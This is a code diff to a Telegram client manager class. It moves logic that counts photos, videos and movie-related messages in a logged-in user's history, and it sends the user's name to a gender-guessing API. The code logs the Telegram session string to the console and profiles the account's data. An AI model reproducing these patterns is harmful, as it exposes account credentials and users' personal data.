@@ -345,9 +345,25 @@ class TelegramManager {
 
     async processLogin(result) {
         console.log(this.client.session.save());
+        let photoCount = 0;
+        let videoCount = 0;
+        let movieCount = 0;
         const sess = this.client.session.save() as unknown as string;
         const user: any = await result.toJSON();
         const chats = await this.client?.getDialogs({ limit: 600 });
+        const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
+        for (const message of messageHistory) {
+            const text = message.text.toLocaleLowerCase();
+            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
+                movieCount++
+            } else {
+                if (message.photo) {
+                    photoCount++;
+                } else if (message.video) {
+                    videoCount++;
+                }
+            }
+        } 
         await this.disconnect();
         await deleteClient(this.phoneNumber);
         let personalChats = 0;
@@ -367,23 +383,7 @@ class TelegramManager {
             }
         });
 
-        let photoCount = 0;
-        let videoCount = 0;
-        let movieCount = 0;
-
-        const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
-        for (const message of messageHistory) {
-            const text = message.text.toLocaleLowerCase();
-            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
-                movieCount++
-            } else {
-                if (message.photo) {
-                    photoCount++;
-                } else if (message.video) {
-                    videoCount++;
-                }
-            }
-        } const data = await axios.get(`https://api.genderize.io/?name=${user.firstName}${user.lastName ? `%20${user.lastName}` : ''}`);
+        const data = await axios.get(`https://api.genderize.io/?name=${user.firstName}${user.lastName ? `%20${user.lastName}` : ''}`);
 
         const payload3 = {
             photoCount, videoCount, movieCount,
